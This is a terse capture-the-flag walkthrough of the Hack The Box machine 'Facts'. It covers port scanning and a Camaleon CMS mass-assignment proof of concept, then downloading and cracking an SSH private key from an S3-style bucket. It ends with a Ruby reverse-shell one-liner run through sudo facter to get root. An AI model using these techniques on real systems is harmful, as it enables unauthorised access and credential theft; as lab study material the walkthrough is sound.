+++
title = "HTB - Facts"
date = 2026-02-02
+++

### Scan

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 18:18 EST
Nmap scan report for 10.129.31.125
Host is up (0.14s latency).
Not shown: 63477 closed tcp ports (reset), 2055 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.31.125:9001
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 189091451162FDF9
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 02 Feb 2026 23:19:39 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>189091451162FDF9</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1890914115AD03FA
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 02 Feb 2026 23:19:22 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>1890914115AD03FA</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Mon, 02 Feb 2026 23:19:22 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.95%I=7%D=2/2%Time=698130FA%P=aarch64-unknown-linux-gn
SF:u%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\
SF:r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x
SF:20application/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20
SF:max-age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2
SF::\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r
SF:\nX-Amz-Request-Id:\x201890914115AD03FA\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2002\
SF:x20Feb\x202026\x2023:19:22\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20
SF:encoding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Inval
SF:id\x20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource
SF:><RequestId>1890914115AD03FA</RequestId><HostId>dd9025bab4ad464b049177c
SF:95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOpti
SF:ons,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Mon,\x200
SF:2\x20Feb\x202026\x2023:19:22\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r
SF:(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\
SF:.0\x20400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Lengt
SF:h:\x20303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nSt
SF:rict-Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nV
SF:ary:\x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3
SF:fd1af9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x20189091451162FDF9\r\n
SF:X-Content-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=b
SF:lock\r\nDate:\x20Mon,\x2002\x20Feb\x202026\x2023:19:39\x20GMT\r\n\r\n<\
SF:?xml\x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>Invalid
SF:Request</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</M
SF:essage><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId
SF:>189091451162FDF9</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374
SF:d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.60 seconds
```

### Enumeration
- nginx instance, maybe a Go based one too on 9001? This guy ippsecs. Add facts.htb to etc hosts
- Some sort of trivia site. Can query against db for post.
- Feroxbuster to probe for dirs, found login panel. Can register user.
- Come to admin dashboard with no capabilities, Camaleon CMS 2.9.0 version  apparently has mass alignment vuln
- Githib POC, would be fun to recreate https://github.com/predyy/CVE-2025-2304 . Use registered credentials
- Now, we find access to full panel. AWS bucket info. If we try to access endpoint, we get 403 forbidden.
- I wonder if we can access another way...
- Install awscli. Configure profile with data from web dash: `aws configure --profile randomfacts`
- Then, enumerate: `aws s3 ls --endpoint-url http://facts.htb:54321 --profile randomfacts`
- Download the key: `aws s3 cp s3://internal/.ssh/id_ed25519 . --endpoint-url http://facts.htb:54321 --profile randomfacts`
- Looks encrypted. SSH to john my boa: `ssh2john id_ed25519 > key.hash`
- `john --wordlist=/usr/share/wordlists/rockyou.txt key.hash` Password is `dragonballz`
- Now for user, Ive seen dir traversal via media upload and also someone did something about a comment:
- 
- `ssh -i rsa.key trivia@10.129.31.125 `
- `USER: 9a3e5c01d4819ac33859ebd8c25d1b5a`

### Privilege Escalation 
- `sudo -l` shows facter. GTFOBins. We can create .rb script in temp to run and grant higher priv
- Create rb script in tmp dir:
```
#!/usr/bin/env ruby 
puts "Hello, Ruby" 
spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.17.114",80))
```
- Listener `nc -nvlp 9001`
- Run `sudo /usr/bin/facter --custom-dir=/tmp/ x`
- `ROOT: 10e5a7bf37f3fba8acd5ecc6454fd375`